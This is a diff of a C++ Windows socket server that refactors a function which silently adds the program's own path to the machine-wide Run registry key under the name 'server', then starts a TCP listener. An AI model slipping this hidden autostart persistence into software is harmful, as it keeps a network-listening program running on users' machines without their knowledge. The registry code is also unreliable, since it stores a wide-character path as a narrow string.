@@ -5,27 +5,28 @@ using namespace std;
 #pragma comment(lib, "Ws2_32.lib")//连接至相应库函数
 #define	MAXLINE		4096	/* max text line length */
 #define	LISTENQ		1024	/* 2nd argument to listen() */
-int  CreateRun()
+
+int setAutoStart()
 {
-    
-    HKEY   hKey; 
+    HKEY hKey; 
     char pFileName[MAX_PATH] = {0};  
-    DWORD dwRet = GetModuleFileNameW(NULL, (LPWCH)pFileName, MAX_PATH); 
     LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
+
+    DWORD dwRet = GetModuleFileNameW(NULL, (LPWCH)pFileName, MAX_PATH); 
     long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey); 
-    if(lRet== ERROR_SUCCESS)
-    {
-        RegSetValueEx(hKey, "server", 0,REG_SZ,(const BYTE*)(LPCSTR)pFileName, MAX_PATH);    
+    if(lRet == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, "server", 0, REG_SZ, (const BYTE*)(LPCSTR)pFileName, MAX_PATH);    
     }
     return 0;
 }
+
 int main(int argc, char* argv[])
 {
 	WSADATA wsa;
 	char buff[MAXLINE];
 	SOCKET servsocket,consocket;
 	struct sockaddr_in servaddr,sockname;
-	 CreateRun();
+        setAutoStart();
 	if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)
 	{
 		cout<<"套接字初始化失败";
@@ -72,4 +73,3 @@ int main(int argc, char* argv[])
 	WSACleanup();
 	return 0;
 }
-
